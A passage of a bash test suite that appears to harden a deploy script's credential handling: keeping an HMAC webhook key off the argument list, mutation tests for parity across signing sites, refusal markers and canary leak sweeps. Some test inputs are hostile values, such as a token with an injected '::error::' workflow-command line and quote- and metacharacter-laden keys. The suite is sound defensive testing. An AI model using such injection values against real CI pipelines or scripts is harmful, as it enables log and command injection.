bk_run bk-mut-bodyecho "$BK_CANARY" 403 "$BKDIR/create-err.json" "$BKDIR/action-success.json" "$m"; bk_check bk-mut-bodyecho "$BK_CANARY"
if [[ " $BK_FAIL " == *" body-in-output "* ]]; then row "mutation: the response body echoed on non-201 turns the 403 row RED (body-in-output)" ok
else row "mutation: the response body echoed on non-201 turns the 403 row RED (body-in-output)" fail "checks: $BK_FAIL"; fi
m="$(bk_mut actioncat 'error) echo' 'error) cat ${BK_TMP}/backup-action; echo')"
bk_run bk-mut-actioncat "$BK_CANARY" 201 "$BKDIR/create-ok.json" "$BKDIR/action-error.json" "$m"; bk_check bk-mut-actioncat "$BK_CANARY"
if [[ " $BK_FAIL " == *" body-in-output "* ]]; then row "mutation: the action document printed on action error turns the action-error row RED (body-in-output)" ok
else row "mutation: the action document printed on action error turns the action-error row RED (body-in-output)" fail "checks: $BK_FAIL"; fi
m="$(bk_mut noshape 'if ! _bearer_ok "$HCLOUD_TOKEN"; then' 'if false; then')"
bk_run bk-mut-noshape "abc"$'\n'"::error::injected-$BK_CANARY" 201 "$BKDIR/create-ok.json" "$BKDIR/action-success.json" "$m"
if [[ "$(bk_count "$ROWS/bk-mut-noshape/out" "$BK_CANARY")" -ge 1 || "$(bk_calls "$ROWS/bk-mut-noshape")" -ge 1 ]]; then row "mutation: the shape check removed lets a hostile value reach the mask line or curl (the hostile rows go RED)" ok
else row "mutation: the shape check removed lets a hostile value reach the mask line or curl (the hostile rows go RED)" fail "the mutant behaved like the original"; fi
echo "=== stage S2-A part 1: backup arm (#8767) done ==="

# =====================================================================================
# STAGE S2-A part 2: the HMAC key of the deploy webhook off `openssl`'s argument list (D1/D3).
# All 19 `openssl dgst -sha256 -hmac "$WEBHOOK_SECRET"` sites are the CANONICAL SNIPPET: the key rides
# the python3 child's ENVIRONMENT only (per-command prefix). The two sites in the `registry-probe)` and
# `doublefire-probe)` arms were the last holdouts (the infra suite's tool census counted a python3 token in those arms); #9757 converted
# them and moved the allowance into the census's single code view (`_probe_arms_code_of` in
# apps/web-platform/infra/cutover-inngest-workflow.test.sh: exactly the two canonical line forms, fixed-string whole-line). The committed
# oracle is the OTHER implementation, `openssl dgst -hmac`, only ever run here with a synthetic key.
# =====================================================================================
HM_CANON="$(cat <<'HM_EOF'
HMAC_KEY="$WEBHOOK_SECRET" python3 -I -c 'import hashlib,hmac,os,sys;k=os.environb.get(b"HMAC_KEY");k or sys.exit(1);sys.stdout.write(hmac.new(k,sys.stdin.buffer.read(),hashlib.sha256).hexdigest())'
HM_EOF
)"
PYDIR="$TMPD/pybin"; HMBIN="$TMPD/hmbin"
for d in "$PYDIR" "$HMBIN"; do assert_fixture_dir "$d"; mkdir -p "$d"; done
REAL_PY="$(type -P python3 || true)"; REAL_OSSL="$(type -P openssl || true)"
[[ -n "$REAL_PY" && -n "$REAL_OSSL" ]] || fatal "stage S2-A part 2: python3 and openssl are both required (canonical snippet + oracle)"
ln -s "$REAL_PY" "$PYDIR/python3"
# Recording tool shim: argv (NUL-delimited), whether HMAC_KEY was present in the tool's own environment, then the REAL tool.
cat > "$HMBIN/rec" <<'REC_EOF'
#!/usr/bin/env bash
D="${BK_SHIM:-}"; tool="${0##*/}"
if [[ -n "$D" ]]; then
  mkdir -p "$D/tools"; n=0
  [[ -r "$D/tools/$tool.n" ]] && read -r n < "$D/tools/$tool.n"
  n=$((n + 1)); printf '%s\n' "$n" > "$D/tools/$tool.n"
  printf '%s\0' "$@" > "$D/tools/$tool-$n.argv"
  [[ -n "${HMAC_KEY+x}" ]] && printf 'present\n' > "$D/tools/$tool-$n.hmackey"
fi
exec "@REAL@" "$@"
REC_EOF
for t in python3 openssl; do
  real="$REAL_PY"; [[ "$t" == openssl ]] && real="$REAL_OSSL"
  sed "1s|.*|#!${BASH_BIN}|; s|@REAL@|${real}|" "$HMBIN/rec" > "$HMBIN/$t"; chmod +x "$HMBIN/$t"
done
rm -f "$HMBIN/rec"

# hm_sign <key> <bodyfile>: the canonical snippet under a clean environment (no inherited HMAC_KEY / PYTHON*).
hm_sign() { env -i PATH="$PYDIR:$REALBIN" WEBHOOK_SECRET="$1" "$BASH_BIN" -c "$HM_CANON" < "$2" 2>/dev/null; }
hm_oracle() { "$REAL_OSSL" dgst -sha256 -hmac "$1" < "$2" | sed 's/.*= //'; }

# --- the canonical snippet ---------------------------------------------------------------------
if [[ "$(LC_ALL=C; printf '%s' "${#HM_CANON}")" == 198 ]]; then row "canonical snippet: 198 bytes, as measured and oracle-checked in Phase 0" ok
else row "canonical snippet: 198 bytes, as measured and oracle-checked in Phase 0" fail "length=$(LC_ALL=C; printf '%s' "${#HM_CANON}")"; fi
printf '' > "$BKDIR/body-empty"
printf '%s' '{"tenant":"synthetic","n":[1,2,3],"s":"a\"b"}' > "$BKDIR/body-json"
printf '%s\n' '{"x":1}' > "$BKDIR/body-nl"
head -c 100000 /dev/zero | tr '\0' 'x' > "$BKDIR/body-big"
HM_KEYS=("k" "$(printf '%*s' 20 '' | tr ' ' 'a')" "$(printf '%*s' 63 '' | tr ' ' 'b')" "$(printf '%*s' 64 '' | tr ' ' '6')" \
  "$(printf '%*s' 65 '' | tr ' ' 'c')" "$(printf '%*s' 96 '' | tr ' ' 'd')" "$(printf '%*s' 200 '' | tr ' ' 'e')" 'a"b\c $d '"'"'e;f|g&h')
hm_bad=""; hm_n=0
for k in "${HM_KEYS[@]}"; do
  for b in empty json nl big; do
    hm_n=$((hm_n + 1))
    got="$(hm_sign "$k" "$BKDIR/body-$b")"; want="$(hm_oracle "$k" "$BKDIR/body-$b")"
    [[ -n "$want" && "$got" == "$want" && "${#got}" == 64 ]] || hm_bad+=" ${#k}/$b"
  done
done
if [[ -z "$hm_bad" && "$hm_n" == 32 ]]; then row "canonical snippet oracle: equals openssl dgst -hmac for 8 synthetic keys (1, 20, 63, 64, 65, 96, 200 bytes and shell-hostile characters) x 4 bodies (empty, JSON, trailing newline, 100 KB)" ok
else row "canonical snippet oracle: equals openssl dgst -hmac for 8 synthetic keys (1, 20, 63, 64, 65, 96, 200 bytes and shell-hostile characters) x 4 bodies (empty, JSON, trailing newline, 100 KB)" fail "n=$hm_n mismatched (keylen/body):$hm_bad"; fi
hm_out="$(env -i PATH="$PYDIR:$REALBIN" "$BASH_BIN" -c "$HM_CANON" < "$BKDIR/body-empty" 2>/dev/null)"; hm_rc=$?
hm_out2="$(env -i PATH="$PYDIR:$REALBIN" WEBHOOK_SECRET= "$BASH_BIN" -c "$HM_CANON" < "$BKDIR/body-empty" 2>/dev/null)"; hm_rc2=$?
hm_out3="$(env -i PATH="$PYDIR:$REALBIN" "$BASH_BIN" -c "set -u; $HM_CANON" < "$BKDIR/body-empty" 2>/dev/null)"; hm_rc3=$?
if [[ "$hm_rc" -ne 0 && -z "$hm_out" && "$hm_rc2" -ne 0 && -z "$hm_out2" && "$hm_rc3" -ne 0 && -z "$hm_out3" ]]; then
  row "canonical snippet: an unset key, an empty key and an unset key under set -u each exit non-zero and print nothing (no silent signature over an empty key)" ok
else row "canonical snippet: an unset key, an empty key and an unset key under set -u each exit non-zero and print nothing (no silent signature over an empty key)" fail "rc unset=$hm_rc empty=$hm_rc2 set-u=$hm_rc3"; fi
hm_leak="$(env -i PATH="$PYDIR:$REALBIN" WEBHOOK_SECRET=synthetic-key "$BASH_BIN" -c "X=\$(printf '' | $HM_CANON); [[ -z \"\${HMAC_KEY+x}\" ]] && printf clean" 2>/dev/null)"
if [[ "$hm_leak" == clean ]]; then row "canonical snippet: HMAC_KEY is a per-command prefix and does not exist in the calling shell afterwards" ok
else row "canonical snippet: HMAC_KEY is a per-command prefix and does not exist in the calling shell afterwards" fail "out=$hm_leak"; fi
# The key reaches python3 through its environment only: recording python3 shim (argv + HMAC_KEY presence), real python3 behind it.
HM_SK="synthetic-argv-key-$(od -An -N6 -tx1 /dev/urandom | tr -d ' \n')"
mkdir -p "$ROWS/hm-argv"
env -i PATH="$HMBIN:$PYDIR:$REALBIN" BK_SHIM="$ROWS/hm-argv" WEBHOOK_SECRET="$HM_SK" "$BASH_BIN" -c "$HM_CANON" < "$BKDIR/body-json" > "$ROWS/hm-argv/out" 2>&1
if [[ -e "$ROWS/hm-argv/tools/python3-1.argv" && -e "$ROWS/hm-argv/tools/python3-1.hmackey" ]] \
   && ! grep -aqF -- "$HM_SK" "$ROWS/hm-argv/tools/python3-1.argv"; then
  row "canonical snippet: the key is in python3's environment (HMAC_KEY present) and in no recorded argument of python3" ok
else row "canonical snippet: the key is in python3's environment (HMAC_KEY present) and in no recorded argument of python3" fail "argv/env evidence missing or key in argv"; fi

# --- parity: every converted copy equals the canonical string; no -hmac operand is left in the script ---
hm_arm_count() { # <from-arm-regex> <to-arm-regex> <ere> <file> -> count of lines matching <ere> inside the arm range [from, to)
  awk -v from="$1" -v to="$2" -v re="$3" '$0 ~ from {f=1; next} $0 ~ to {f=0} f && $0 ~ re {n++} END {print n+0}' "$4"
}
# hm_audit <script> [default-want]: ONE function reads the parity facts, so the real rows and the mutation rows below judge with the same code.
#   It reads ANY indentation (the cutover script's copies sit at 4 spaces, the workflow-step copies at 10, the two inline scripts at 0), and
#   the body a site signs is derived from the arm's own `_sig_curl <VAR>` request; a file whose request is not an `_sig_curl` call (the two
#   inline scripts, which print their header directives themselves) passes [default-want] (`empty`: a status GET).
#   HM_BAD    space-separated copy indices that differ from the canonical snippet, lost the SIG=$(printf <body> | ...) shape, lost the
#             `|| VAR=""` fallback, or sign a body other than the one their own request carries (derived per site, see below)
#   HM_NCOPY  converted copies; HM_NOLD lines carrying the -hmac operand; HM_RP / HM_DP of those inside the registry-probe) /
#   doublefire-probe) arms; HM_PYARMS python3 tokens inside the registry-probe) .. rearm) range (the two canonical lines, the ONLY ones the
#   infra suite's census allowance lets through)
HM_RE_EMPTY='^[[:space:]]*[A-Z][A-Za-z0-9_]*=\$\(printf '"''"' \| HMAC_KEY='
HM_RE_PAYLOAD='^[[:space:]]*[A-Z][A-Za-z0-9_]*=\$\(printf '"'%s'"' "\$PAYLOAD" \| HMAC_KEY='
hm_audit() {
  local f="$1" dflt="${2:-}" ln rest seg i=0 shape n j k var tail blk want
  local -a L
  HM_BAD=""
  mapfile -t L < "$f"
  for n in "${!L[@]}"; do
    ln="${L[n]}"
    [[ "$ln" == *'HMAC_KEY="$WEBHOOK_SECRET" python3'* ]] || continue
    i=$((i + 1)); shape=0
    # the assigned variable and the fail-safe fallback `|| VAR=""` (an empty WEBHOOK_SECRET or a missing python3 must leave VAR empty so
    # _sig_curl's _bearer_ok refuses with the marker, instead of `set -e` aborting the whole script at the assignment, mute)
    var="${ln%%=*}"; var="${var#"${var%%[![:space:]]*}"}"
    rest="${ln#*| }"; tail=") || ${var}=\"\""; seg=""
    [[ "$rest" == *"$tail" ]] && seg="${rest%"$tail"}"
    # the body this site signs is DERIVED from the arm's own request, never hand-listed: the first `_sig_curl <VAR>` after the site, with its
    # backslash continuations; a request carrying `-d "$PAYLOAD"` / `--data` signs `printf '%s' "$PAYLOAD"`, any other (a GET) signs `printf ''`
    blk=""
    for ((j = n + 1; j < n + 40 && j < ${#L[@]}; j++)); do
      if [[ "${L[j]}" == *"_sig_curl $var "* ]]; then
        k=$j; blk="${L[k]}"
        while [[ "${L[k]}" == *'\' && $((k + 1)) -lt ${#L[@]} ]]; do k=$((k + 1)); blk+=" ${L[k]}"; done
        break
      fi
    done
    want="$dflt"
    if [[ -n "$blk" ]]; then
      if [[ "$blk" == *'-d "$PAYLOAD"'* || "$blk" == *' --data'* ]]; then want=payload; else want=empty; fi
    fi
    case "$want" in
      empty) [[ "$ln" =~ $HM_RE_EMPTY ]] && shape=1 ;;
      payload) [[ "$ln" =~ $HM_RE_PAYLOAD ]] && shape=1 ;;
    esac
    [[ "$seg" == "$HM_CANON" && "$shape" == 1 ]] || HM_BAD+=" $i"
  done
  HM_NCOPY=$i
  HM_NOLD="$(grep -cF -e '-hmac' "$f" || true)"
  HM_RP="$(hm_arm_count '^[[:space:]]+registry-probe[)]$' '^[[:space:]]+doublefire-probe[)]$' 'openssl dgst -sha256 -hmac "[$]WEBHOOK_SECRET"' "$f")"
  HM_DP="$(hm_arm_count '^[[:space:]]+doublefire-probe[)]$' '^[[:space:]]+rearm[)]$' 'openssl dgst -sha256 -hmac "[$]WEBHOOK_SECRET"' "$f")"
  HM_PYARMS="$(hm_arm_count '^[[:space:]]+registry-probe[)]$' '^[[:space:]]+rearm[)]$' 'python3' "$f")"
}
# hm_audit_ok: the whole parity contract at once (19 identical copies, no -hmac operand anywhere, exactly the two canonical python3 lines in the probe-arm range).
hm_audit_ok() { [[ -z "$HM_BAD" && "$HM_NCOPY" == 19 && "$HM_NOLD" == 0 && "$HM_RP" == 0 && "$HM_DP" == 0 && "$HM_PYARMS" == 2 ]]; }
hm_audit "$CUT"
for hm_i in $(seq 1 19); do
  if [[ " $HM_BAD " != *" $hm_i "* && "$hm_i" -le "$HM_NCOPY" ]]; then row "cutover HMAC copy $hm_i equals the canonical snippet, keeps the SIG=\$(printf <body> | ...) || SIG=\"\" shape and signs the body its own request carries" ok
  else row "cutover HMAC copy $hm_i equals the canonical snippet, keeps the SIG=\$(printf <body> | ...) || SIG=\"\" shape and signs the body its own request carries" fail "copy missing or differs from the canonical string, lost its fallback, or signs the wrong body (bad:$HM_BAD copies=$HM_NCOPY)"; fi
done
if [[ "$HM_NCOPY" == 19 && -z "$HM_BAD" ]]; then row "cutover HMAC: exactly 19 converted copies (every one of the 19 sites), no extra or divergent copy" ok
else row "cutover HMAC: exactly 19 converted copies (every one of the 19 sites), no extra or divergent copy" fail "copies=$HM_NCOPY bad:$HM_BAD"; fi
if [[ "$HM_NOLD" == 0 && "$HM_RP" == 0 && "$HM_DP" == 0 && "$HM_PYARMS" == 2 ]]; then
  row "cutover HMAC: zero -hmac operands remain in the script (registry-probe) and doublefire-probe) are converted) and the probe-arm range holds exactly the two canonical python3 lines" ok
else row "cutover HMAC: zero -hmac operands remain in the script (registry-probe) and doublefire-probe) are converted) and the probe-arm range holds exactly the two canonical python3 lines" fail "file=$HM_NOLD registry-probe=$HM_RP doublefire-probe=$HM_DP python3-in-arms=$HM_PYARMS"; fi

# MUTATIONS of the parity contract: one mutant per copy index and per kind, each judged by the SAME hm_audit. A suite that
# only ever audits the first copy, or counts instead of comparing bytes, leaves one of these green.
nth_replace() { # <src> <out> <needle> <repl> <n>: replace the n-th occurrence only; rc 3 when there are fewer than n
  assert_fixture_dir "$2"
  "$REAL_PY" -I -c '
import sys
src, out, needle, repl, n = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], int(sys.argv[5])
s = open(src).read(); i = -1
for _ in range(n):
    i = s.find(needle, i + 1)
    if i < 0:
        sys.exit(3)
open(out, "w").write(s[:i] + repl + s[i + len(needle):])
' "$1" "$2" "$3" "$4" "$5"
}
HM_PFX='HMAC_KEY="$WEBHOOK_SECRET" python3 -I -c'
# hm_touched <original> <mutant>: the changed line RANGES of the mutant (diff normal format, e.g. "1328c1328"); a mutant must touch
# exactly the line it claims to, so a mutation that landed somewhere else cannot satisfy its row.
hm_touched() { diff "$1" "$2" | grep -E '^[0-9,]+c[0-9,]+$' | paste -sd' ' -; }
hm_nth_line() { grep -n -F -e "$3" "$2" | sed -n "${1}p" | cut -d: -f1; } # <n> <file> <literal> -> line number of the n-th match
for idx in $(seq 1 19); do
  nth_replace "$CUT" "$BKDIR/hm-mut-$idx.sh" "$HM_PFX" 'HMAC_KEY="$WEBHOOK_SECRET" python3 -c' "$idx" || fatal "parity mutation $idx did not land"
  hm_audit "$BKDIR/hm-mut-$idx.sh"; hm_ln="$(hm_nth_line "$idx" "$CUT" 'HMAC_KEY="$WEBHOOK_SECRET" python3')"
  if [[ "$HM_BAD" == " $idx" && "$(hm_touched "$CUT" "$BKDIR/hm-mut-$idx.sh")" == "${hm_ln}c${hm_ln}" ]] && ! hm_audit_ok; then row "mutation: dropping -I from copy $idx alone (line $hm_ln only) is caught as exactly copy $idx (parity is per copy, not first copy)" ok
  else row "mutation: dropping -I from copy $idx alone (line $hm_ln only) is caught as exactly copy $idx (parity is per copy, not first copy)" fail "bad:$HM_BAD touched:$(hm_touched "$CUT" "$BKDIR/hm-mut-$idx.sh") want:${hm_ln}c${hm_ln}"; fi
done
nth_replace "$CUT" "$BKDIR/hm-mut-emptykey.sh" 'k or sys.exit(1);' '' 7 || fatal "parity mutation emptykey did not land"
hm_audit "$BKDIR/hm-mut-emptykey.sh"; hm_ln="$(hm_nth_line 7 "$CUT" 'HMAC_KEY="$WEBHOOK_SECRET" python3')"
if [[ "$HM_BAD" == " 7" && "$(hm_touched "$CUT" "$BKDIR/hm-mut-emptykey.sh")" == "${hm_ln}c${hm_ln}" ]]; then row "mutation: dropping the empty-key exit from copy 7 alone (line $hm_ln only) is caught as exactly copy 7" ok
else row "mutation: dropping the empty-key exit from copy 7 alone (line $hm_ln only) is caught as exactly copy 7" fail "bad:$HM_BAD touched:$(hm_touched "$CUT" "$BKDIR/hm-mut-emptykey.sh")"; fi
nth_replace "$CUT" "$BKDIR/hm-mut-argvback.sh" "$HM_CANON" "openssl dgst -sha256 -hmac \"\$WEBHOOK_SECRET\" | sed 's/.*= //'" 5 || fatal "parity mutation argvback did not land"
hm_audit "$BKDIR/hm-mut-argvback.sh"
if [[ "$HM_NCOPY" == 18 && "$HM_NOLD" == 1 ]] && ! hm_audit_ok; then row "mutation: the key put back on openssl's argv in copy 5 is caught (18 copies, a -hmac operand where the script has none)" ok
else row "mutation: the key put back on openssl's argv in copy 5 is caught (18 copies, a -hmac operand where the script has none)" fail "copies=$HM_NCOPY -hmac=$HM_NOLD"; fi
{ cat "$CUT"; printf '%s\n' "    SIGX=\$(printf '' | ${HM_CANON/sha256/sha1})"; } > "$BKDIR/hm-mut-extra.sh"
hm_audit "$BKDIR/hm-mut-extra.sh"
if [[ "$HM_NCOPY" == 20 && " $HM_BAD " == *" 20 "* ]] && ! hm_audit_ok; then row "mutation: a 20th inline copy that differs by one byte is caught (copy count and byte comparison)" ok
else row "mutation: a 20th inline copy that differs by one byte is caught (copy count and byte comparison)" fail "copies=$HM_NCOPY bad:$HM_BAD"; fi
# The two probe arms (copies 2 and 3, in file order) put back on the argv form: each revert is caught by the parity contract AND by the S4 HMAC census
# (the allow-list is empty), pinned to its own arm anchor. The two mutants live on in $BKDIR for the census rows in stage S4.
for hm_rv in "revert1:2:1:0:registry-probe)" "revert2:3:0:1:doublefire-probe)"; do
  IFS=: read -r hm_rvn hm_rvi hm_rvrp hm_rvdp hm_rvarm <<< "$hm_rv"
  nth_replace "$CUT" "$BKDIR/hm-mut-$hm_rvn.sh" "$HM_CANON" "openssl dgst -sha256 -hmac \"\$WEBHOOK_SECRET\" | sed 's/.*= //'" "$hm_rvi" || fatal "parity mutation $hm_rvn did not land"
  hm_audit "$BKDIR/hm-mut-$hm_rvn.sh"; hm_ln="$(hm_nth_line "$hm_rvi" "$CUT" 'HMAC_KEY="$WEBHOOK_SECRET" python3')"
  if [[ "$HM_NCOPY" == 18 && "$HM_NOLD" == 1 && "$HM_RP" == "$hm_rvrp" && "$HM_DP" == "$hm_rvdp" && "$HM_PYARMS" == 1 && "$(hm_touched "$CUT" "$BKDIR/hm-mut-$hm_rvn.sh")" == "${hm_ln}c${hm_ln}" ]] && ! hm_audit_ok; then row "mutation: reverting the $hm_rvarm site to openssl dgst -hmac (line $hm_ln only) is caught, pinned by its arm anchor (registry-probe) count $hm_rvrp, doublefire-probe) count $hm_rvdp)" ok
  else row "mutation: reverting the $hm_rvarm site to openssl dgst -hmac (line $hm_ln only) is caught, pinned by its arm anchor (registry-probe) count $hm_rvrp, doublefire-probe) count $hm_rvdp)" fail "copies=$HM_NCOPY -hmac=$HM_NOLD registry-probe=$HM_RP doublefire-probe=$HM_DP python3-in-arms=$HM_PYARMS touched:$(hm_touched "$CUT" "$BKDIR/hm-mut-$hm_rvn.sh") want:${hm_ln}c${hm_ln}"; fi
done

# Mutants of the two per-site facets hm_audit now owns (the fail-safe fallback and the body each site signs). hm_site_mut rewrites ONLY
# the idx-th converted site line (sets HM_MUT_LN to its line number); every row asserts the mutant touched exactly that line, that the
# audit names exactly that copy, and that the whole-contract check is red.
hm_site_mut() { # <idx> <out> <kind: nofallback|wrongvar|body-empty|body-payload>
  local idx="$1" out="$2" kind="$3" n=0 i ln pe pp
  local -a lines
  assert_fixture_dir "$out"
  mapfile -t lines < "$CUT"
  pe="printf '' |"; pp="printf '%s' \"\$PAYLOAD\" |"
  for i in "${!lines[@]}"; do
    ln="${lines[i]}"
    [[ "$ln" == *'HMAC_KEY="$WEBHOOK_SECRET" python3'* ]] || continue
    n=$((n + 1)); [[ "$n" == "$idx" ]] || continue
    HM_MUT_LN=$((i + 1))
    case "$kind" in
      nofallback) lines[i]="${ln% || *}" ;;
      wrongvar) lines[i]="${ln% || *} || XSIG=\"\"" ;;
      body-empty) lines[i]="${ln/"$pp"/"$pe"}" ;;
      body-payload) lines[i]="${ln/"$pe"/"$pp"}" ;;
    esac
  done
  printf '%s\n' "${lines[@]}" > "$out"
}
hm_first_idx() { # <file> <literal> -> the index, among the converted copies, of the first one whose line holds <literal> (empty when none)
  local n=0 ln
  while IFS= read -r ln; do n=$((n + 1)); [[ "$ln" == *"$2"* ]] && { printf '%s' "$n"; return 0; }; done < <(grep -F 'HMAC_KEY="$WEBHOOK_SECRET" python3' "$1")
  return 0
}
hm_audit "$CUT"; hm_last="$HM_NCOPY"
hm_idx_payload="$(hm_first_idx "$CUT" "printf '%s' \"\$PAYLOAD\" |")"; hm_idx_empty="$(hm_first_idx "$CUT" "printf '' |")"
[[ -n "$hm_idx_payload" && -n "$hm_idx_empty" && "$hm_last" == 19 && -z "$HM_BAD" ]] || fatal "parity mutations: could not derive a payload-body copy and an empty-body copy from the real script"
for hm_k in "nofallback:$hm_last:dropping the || SIG=\"\" fallback from the last copy" "nofallback:1:dropping the || SIG=\"\" fallback from the first copy" \
            "wrongvar:$hm_idx_payload:SHAPE PIN only (behaviourally equivalent to the real fallback, since the assignment has already left its variable empty; not a behaviour catch): a fallback that blanks a different variable (copy $hm_idx_payload)" \
            "body-empty:$hm_idx_payload:signing the empty body in copy $hm_idx_payload, whose request carries -d \"\$PAYLOAD\" (a POST signed over nothing is a 401)" \
            "body-payload:$hm_idx_empty:signing \$PAYLOAD in copy $hm_idx_empty, whose request is a bodyless GET"; do
  IFS=: read -r hm_kind hm_idx hm_desc <<< "$hm_k"
  hm_site_mut "$hm_idx" "$BKDIR/hm-mut-$hm_kind-$hm_idx.sh" "$hm_kind"; hm_audit "$BKDIR/hm-mut-$hm_kind-$hm_idx.sh"
  if [[ "$HM_BAD" == " $hm_idx" && "$(hm_touched "$CUT" "$BKDIR/hm-mut-$hm_kind-$hm_idx.sh")" == "${HM_MUT_LN}c${HM_MUT_LN}" ]] && ! hm_audit_ok; then row "mutation: $hm_desc is caught as exactly copy $hm_idx (line $HM_MUT_LN only)" ok
  else row "mutation: $hm_desc is caught as exactly copy $hm_idx (line $HM_MUT_LN only)" fail "bad:$HM_BAD touched:$(hm_touched "$CUT" "$BKDIR/hm-mut-$hm_kind-$hm_idx.sh") want:${HM_MUT_LN}c${HM_MUT_LN}"; fi
done

# --- the refusal marker on the _sig_curl / _bearer_curl refusal arms ---------------------------------
SC_DRV="$BKDIR/sigdriver.sh"; assert_fixture_dir "$SC_DRV"
{
  printf 'set -euo pipefail\n'
  grep -m1 '^_bearer_ok() {' "$CUT"
  awk '/^_bearer_curl\(\) \{$/,/^}$/' "$CUT"
  awk '/^_sig_curl\(\) \{$/,/^}$/' "$CUT"
  printf 'case "$SC_CALL" in\n  sig) _sig_curl SIG http://127.0.0.1:9/x ;;\n  bearer) _bearer_curl TOK http://127.0.0.1:9/x ;;\nesac\n'
} > "$SC_DRV"
sc_run() { # <rowname> <SIG> <ID> <SECRET> <call> [TOK]
  local row="$ROWS/$1"; assert_fixture_dir "$row"; mkdir -p "$row/shim"
  ( cd "$row" && env -i PATH="$BKBIN:$REALBIN" BK_SHIM="$row/shim" SC_CALL="$5" SIG="$2" CF_ACCESS_CLIENT_ID="$3" CF_ACCESS_CLIENT_SECRET="$4" TOK="${6:-}" \
      "$BASH_BIN" "$SC_DRV" < /dev/null > "$row/stdout" 2> "$row/stderr" )
  SC_RC=$?
}
SC_MARK='SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape'
SC_HOT="hostile\"value-$BK_CANARY"
sc_ok_sig="$(printf '%*s' 64 '' | tr ' ' 'a')"
for case_spec in "sig-var:sig:$SC_HOT:cfid:cfsecret:" "cf-id:sig:$sc_ok_sig:$SC_HOT:cfsecret:" "cf-secret:sig:$sc_ok_sig:cfid:$SC_HOT:" "bearer-var:bearer:$sc_ok_sig:cfid:cfsecret:$SC_HOT"; do
  IFS=: read -r cname ccall csig cid csecret ctok <<< "$case_spec"
  sc_run "sc-$cname" "$csig" "$cid" "$csecret" "$ccall" "$ctok"
  scbad=""
  [[ "$SC_RC" -eq 2 ]] || scbad+=" rc=$SC_RC"
  [[ "$(bk_calls "$ROWS/sc-$cname")" == 0 ]] || scbad+=" curl-called"
  [[ "$(bk_count "$ROWS/sc-$cname/stderr" "$SC_MARK")" == 1 ]] || scbad+=" marker-count=$(bk_count "$ROWS/sc-$cname/stderr" "$SC_MARK")"
  [[ "$(bk_count "$ROWS/sc-$cname/stderr" "$BK_CANARY")" == 0 && "$(bk_count "$ROWS/sc-$cname/stdout" "$BK_CANARY")" == 0 ]] || scbad+=" value-in-output"
  if [[ -z "$scbad" ]]; then row "refusal arm $cname: a hostile value returns 2 with zero requests, exactly one value-free SOLEUR_CREDENTIAL_REFUSED marker on stderr, the value absent" ok
  else row "refusal arm $cname: a hostile value returns 2 with zero requests, exactly one value-free SOLEUR_CREDENTIAL_REFUSED marker on stderr, the value absent" fail "$scbad"; fi
done
sc_run sc-valid "$sc_ok_sig" cfid cfsecret sig
if [[ "$SC_RC" -eq 0 && "$(bk_calls "$ROWS/sc-valid")" == 1 && "$(bk_count "$ROWS/sc-valid/stderr" SOLEUR_CREDENTIAL_REFUSED)" == 0 ]] \
   && grep -qxF "header = \"X-Signature-256: sha256=$sc_ok_sig\"" "$ROWS/sc-valid/shim/calls/1.stdin"; then
  row "refusal arm control: a well-formed signature and Cloudflare Access pair reach curl on stdin with no marker" ok
else row "refusal arm control: a well-formed signature and Cloudflare Access pair reach curl on stdin with no marker" fail "rc=$SC_RC"; fi
n_sigfn_end="$(awk '/^_sig_curl\(\) \{$/,/^}$/' "$CUT" | grep -c '^}$' || true)"
if [[ "$n_sigfn_end" == 1 ]] && "$BASH_BIN" -n "$SC_DRV" 2>/dev/null; then row "_sig_curl stays one ^_sig_curl() {\$ ... ^}\$ range (the infra suite's awk splice extracts it whole) and the driver parses" ok
else row "_sig_curl stays one ^_sig_curl() {\$ ... ^}\$ range (the infra suite's awk splice extracts it whole) and the driver parses" fail "closers=$n_sigfn_end"; fi

# --- canary sweep: the real script, op=enumerate (the first converted site), shims in failure modes ----
CUTSB="$TMPD/cutsb"; assert_fixture_dir "$CUTSB"; mkdir -p "$CUTSB/scripts"
sed 's|/tmp/|${TMPDIR}/|g' "$CUT" > "$CUTSB/scripts/cutover-inngest.sh"   # same code; scratch paths instead of the shared /tmp
ln -s "$REPO_ROOT/scripts/lib" "$CUTSB/scripts/lib"
printf '%s' '[{"reminder_id":"r1"}]' > "$BODIES/enum_array.json"
printf '%s' '{not json' > "$BODIES/enum_malformed.json"
HM_WH="whcanary-$(od -An -N8 -tx1 /dev/urandom | tr -d ' \n')"
HM_CFID="cfid-canary-$(od -An -N6 -tx1 /dev/urandom | tr -d ' \n')"
HM_CFSEC="cfsec-canary-$(od -An -N6 -tx1 /dev/urandom | tr -d ' \n')"
cs_run() { # <rowname> <SHIM_MODE> <SHIM_STATUS or empty> <bodyfile> [NAME=value ...: environment that wins over the defaults; CS_PATH overrides the PATH; CS_NOWH=1 leaves WEBHOOK_SECRET out of the environment altogether]
  local row="$ROWS/$1" mode="$2" status="$3" body="$4"; shift 4
  local -a wh=("WEBHOOK_SECRET=$HM_WH")
  [[ "${CS_NOWH:-}" == 1 ]] && wh=()
  assert_fixture_dir "$row"; mkdir -p "$row/home" "$row/tmp" "$row/shim"
  ( cd "$row" && env -i PATH="${CS_PATH-$HMBIN:$SHIMDIR:$REALBIN:$PYDIR}" HOME="$row/home" TMPDIR="$row/tmp" SHIM_DIR="$row/shim" BK_SHIM="$row/shim" SHIM_FIXTURE_TOKEN="none" \
      SHIM_MODE="$mode" SHIM_STATUS="$status" SHIM_BODY_FILE="$body" OP=enumerate ${wh[@]+"${wh[@]}"} CF_ACCESS_CLIENT_ID="$HM_CFID" CF_ACCESS_CLIENT_SECRET="$HM_CFSEC" \
      "$@" "$BASH_BIN" "$CUTSB/scripts/cutover-inngest.sh" < /dev/null > "$row/stdout" 2> "$row/stderr" )
  CS_RC=$?
}
cs_leaks() { # <rowname> -> names of the places the canaries appear (empty = none): output, curl argv, openssl argv, python3 argv
  local row="$ROWS/$1" c f out=""
  for c in "$HM_WH" "$HM_CFID" "$HM_CFSEC"; do
    grep -aqF -- "$c" "$row/stdout" "$row/stderr" 2>/dev/null && out+=" output"
    for f in "$row"/shim/calls/*.argv "$row"/shim/tools/*.argv; do [[ -e "$f" ]] && grep -aqF -- "$c" "$f" && out+=" argv:${f##*/}"; done
  done
  printf '%s' "$out" | tr ' ' '\n' | awk 'NF && !s[$0]++' | paste -sd' ' -
}
cs_run cs-200 noauth "" "$BODIES/enum_array.json"
